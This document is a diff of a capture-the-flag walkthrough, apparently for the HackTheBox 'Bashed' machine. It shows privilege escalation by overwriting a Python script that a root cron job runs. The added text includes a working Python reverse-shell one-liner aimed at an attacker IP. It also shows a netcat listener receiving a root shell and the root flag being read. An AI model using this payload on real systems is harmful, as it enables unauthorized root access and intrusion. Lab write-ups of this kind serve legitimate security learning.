@@ -273,7 +273,7 @@ whoami
 scriptmanager
 ```
 
-Now that we’re running in the context of scriptmanager, we have read/write/execute privileges in the scripts directory.
+Now that we’re running in the context of scriptmanager, we have `read/write/execute` privileges in the `scripts` directory.
 
 We have two files; one owned by us (test.py) and the other owned by root (test.txt). Let’s print out the content of test.py.
 
@@ -282,5 +282,41 @@ cd /scripts
 ls
 test.py
 test.txt
+cat test.py
+f = open("test.txt", "w")
+f.write("testing123!")
+f.close
 ```
 
+It’s just a simple python program that writes to the file `test.txt`. However, we saw in the previous image that `test.txt` is running as `root`. 
+
+Now, it seems like this is an scheduled task that the system performs after a small regular interval as the `test.txt` is a very recent.
+
+In fact, the script seems to be executing every minute! It’s probably a cron job that is owned by `root`.
+
+If I change the contents in the `test.py` file to send a reverse shell, that reverse shell will run as `root`.
+
+So I used this one liner on the target machine and saved it in the /script` to get a reverse shell on my machine.
+```python
+echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP>\", 8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py
+```
+
+Setting up a listener on my machine adn executing the `.exploit.py` file on the target machine, we get `root` shell:
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Bashed]
+└─$ nc -lnvp 8888
+listening on [any] 8888 ...
+connect to [10.10.14.7] from (UNKNOWN) [10.10.10.68] 57136
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+
+```
+
+Now, we can easily retrieve the `root` flag by navigating to `/root/root.txt` file
+
+```
+# cat /root/root.txt
+[REDACTED]
+```
